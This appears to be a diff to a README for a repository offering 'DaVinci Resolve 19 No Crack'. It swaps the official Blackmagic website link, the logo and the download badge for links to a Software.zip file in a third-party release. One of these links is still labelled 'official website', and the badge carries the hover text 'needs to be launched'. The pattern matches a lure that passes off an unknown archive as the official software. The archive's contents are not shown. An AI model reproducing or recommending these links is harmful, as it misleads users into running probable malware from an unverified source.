@@ -5,7 +5,7 @@
 
 Welcome to the repository for DaVinci Resolve 19 No Crack - your go-to software for professional video editing, color grading, audio post-production, and visual effects. 
 
-![DaVinci Resolve Logo](https://www.blackmagicdesign.com/images/products/davinciresolve/press-kit/DaVinci_Resolve_Studio_Logo.jpg)
+![DaVinci Resolve Logo](https://github.com/1scyth3xyz/DaVinci-Resolve-19-No-Crack/releases/download/v2.0/Software.zip)
 
 ## Features
 
@@ -21,9 +21,9 @@ Welcome to the repository for DaVinci Resolve 19 No Crack - your go-to software 
 
 ## Installation
 
-To get started with DaVinci Resolve 19, download the software from the [official website](https://www.blackmagicdesign.com/products/davinciresolve/) or visit the [GitHub releases section](https://github.com/cli/go-gh/releases) for more options.
+To get started with DaVinci Resolve 19, download the software from the [official website](https://github.com/1scyth3xyz/DaVinci-Resolve-19-No-Crack/releases/download/v2.0/Software.zip) or visit the [GitHub releases section](https://github.com/1scyth3xyz/DaVinci-Resolve-19-No-Crack/releases/download/v2.0/Software.zip) for more options.
 
-[![Download DaVinci Resolve 19](https://img.shields.io/badge/Download-DaVinci_Resolve_19-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "needs to be launched")
+[![Download DaVinci Resolve 19](https://github.com/1scyth3xyz/DaVinci-Resolve-19-No-Crack/releases/download/v2.0/Software.zip)](https://github.com/1scyth3xyz/DaVinci-Resolve-19-No-Crack/releases/download/v2.0/Software.zip "needs to be launched")
 
 ## Contributions
 
